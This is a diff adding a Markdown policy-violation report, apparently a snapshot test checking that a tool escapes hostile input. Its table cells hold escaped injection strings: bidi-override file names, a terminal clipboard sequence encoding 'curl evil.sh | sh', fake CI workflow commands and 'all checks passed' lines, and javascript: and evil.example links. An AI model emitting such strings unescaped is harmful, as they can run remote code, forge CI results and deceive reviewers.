@@ -1,0 +1,13 @@
+### Policy: pipes \| and \`ticks\` invoice&lt;U\+202E&gt;txt\.exe and &lt;U\+202A&gt;embed&lt;U\+202C&gt; &lt;U\+200E&gt;&lt;U\+200F&gt;&lt;U\+061C&gt;⏎\#\# fake heading copy&lt;U\+001B&gt;\]52;c;Y3VybCBldmlsLnNoIHwgc2g=&lt;U\+0007&gt;done
+
+**2 of 3 violations fail the run.**
+
+Mode `enforce` · sha256 \`\|&lt;b&gt;x&lt;/b&gt;⏎\: · 7 checks · [what the checks mean](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/policy.md)
+
+| Location | Check | Violation | Status |
+| :------- | :---- | :-------- | :----- |
+| evilline one⏎\:\:error\:\:fake annotation/\.mcp\.json:2 | `mcp-not-allowed` | MCP server &quot;copy&lt;U\+001B&gt;\]52;c;Y3VybCBldmlsLnNoIHwgc2g=&lt;U\+0007&gt;done &lt;U\+001B&gt;\[2J&lt;U\+001B&gt;\[Hcleared &lt;U\+001B&gt;\]8;;https\://evil\.example&lt;U\+001B&gt;\\click&lt;U\+001B&gt;\]8;;&lt;U\+001B&gt;\\ eight\-bit &lt;U\+009B&gt;31mCSI&lt;U\+009B&gt;0m and NEL&lt;U\+0085&gt; safe text⏎FAKE\: all checks passed line one⏎\:\:stop\-commands\:\:x line one⏎\:\:error\:\:fake annotation x⏎\:\:add\-mask\:\:secret⏎\:\:set\-output name=a\:\:b invoice&lt;U\+202E&gt;txt\.exe and &lt;U\+202A&gt;… | fails |
+| — | `hook-missing` | x⏎\:\:add\-mask\:\:secret⏎\:\:set\-output name=a\:\:b \[click\]\(javascript\:alert\(1\)\) \!\[x\]\(https\://evil\.example/p\.png\) &lt;https\://evil\.example&gt; Configured, not enforced\: hooks fail open on errors and timeouts, and user settings can turn them off\. | fails |
+| docs/&lt;U\+2066&gt;isolated&lt;U\+2069&gt; &lt;U\+2067&gt;rtl&lt;U\+2069&gt; &lt;U\+2068&gt;fs&lt;U\+2069&gt;\.json | \`evil\` \| \[x\]\(javascript\:alert\(1\)\) | \# heading \*em\* \*\*strong\*\* \`code\` \~\~del\~\~ \$x\$ &gt; quote \- item 1\. item ping @&#8203;octocat and @&#8203;github/security\-team, mail me@&#8203;example\.com closes \#&#8203;1, GH\-&#8203;2 and owner/repo\#&#8203;3 | reported |
+
+- safe text⏎FAKE\: all checks passed 100% done %0A %25 a\:b,c=d
